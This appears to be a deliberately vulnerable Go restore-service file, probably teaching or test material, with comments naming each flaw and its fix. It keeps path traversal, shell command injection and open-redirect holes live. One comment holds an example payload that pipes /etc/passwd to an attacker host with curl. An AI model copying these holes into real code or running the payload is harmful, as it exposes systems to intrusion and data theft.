package backup

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

/*
Restore Service

Handles restore requests: fetches a backup snapshot by ID, decompresses
it into the target directory, and redirects the caller to the status page.
*/

const backupStorageRoot = "/var/backup/snapshots"

// ── Snapshot store ────────────────────────────────────────────────────────

type Snapshot struct {
	ID        string
	TenantID  string
	Path      string
	SizeBytes int64
}

var snapshotDB = map[string]*Snapshot{
	"snap-001": {ID: "snap-001", TenantID: "tenant-alpha", Path: "snap-001.tar.gz", SizeBytes: 1048576},
	"snap-002": {ID: "snap-002", TenantID: "tenant-beta", Path: "snap-002.tar.gz", SizeBytes: 2097152},
}

func GetSnapshot(snapshotID string) (*Snapshot, error) {
	snap, ok := snapshotDB[snapshotID]
	if !ok {
		return nil, fmt.Errorf("snapshot not found: %s", snapshotID)
	}
	return snap, nil
}

// ── Restore execution ─────────────────────────────────────────────────────

/*
RestoreSnapshot decompresses a snapshot archive into destDir.

VULN-8 (Path traversal via filepath.Join absolute-path override):
filepath.Join silently discards all preceding elements when it encounters
an absolute path component.  If destDir is attacker-controlled and is an
absolute path (e.g. "/etc"), filepath.Join(backupStorageRoot, "/etc")
returns "/etc", completely bypassing the intended storage root confinement.
The fix is to validate that the resolved path still has backupStorageRoot
as a prefix after Join.

VULN-9 (Command injection via sh -c with unsanitised environment value):
COMPRESS_TOOL is read from the process environment and embedded verbatim
into a shell command string passed to "sh -c".  An operator—or an attacker
who can set environment variables (e.g. via a misconfigured orchestrator
secret)—can inject shell metacharacters:
  COMPRESS_TOOL="gzip; curl http://attacker/$(cat /etc/passwd | base64)"
exec.Command should be invoked directly with split arguments, bypassing
the shell entirely.
*/
func RestoreSnapshot(snap *Snapshot, destDir string) error {
	// filepath.Join with a caller-supplied absolute destDir silently ignores
	// backupStorageRoot and resolves to destDir alone.
	outputPath := filepath.Join(backupStorageRoot, destDir, snap.Path)

	compressTool := os.Getenv("COMPRESS_TOOL")
	if compressTool == "" {
		compressTool = "gzip"
	}

	// Shell injection: compressTool value is concatenated without escaping.
	shellCmd := compressTool + " -d " + outputPath
	cmd := exec.Command("sh", "-c", shellCmd)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// ── HTTP handler ──────────────────────────────────────────────────────────

/*
HandleRestoreComplete redirects the user to a post-restore status page.

VULN-10 (Open redirect — double-slash prefix bypass):
The guard checks strings.HasPrefix(next, "/") to ensure the redirect
target is a relative path.  A value like "//evil.com/phish" passes the
check (it does start with "/") but browsers interpret a double-slash as
a protocol-relative URL and navigate to evil.com.
The correct check is: strings.HasPrefix(next, "/") && !strings.HasPrefix(next, "//").
*/
func HandleRestoreComplete(w http.ResponseWriter, r *http.Request) {
	next := r.URL.Query().Get("next")
	if next == "" {
		next = "/dashboard"
	}

	// "//evil.com" starts with "/" — this guard is insufficient.
	if !strings.HasPrefix(next, "/") {
		next = "/dashboard"
	}

	http.Redirect(w, r, next, http.StatusFound)
}
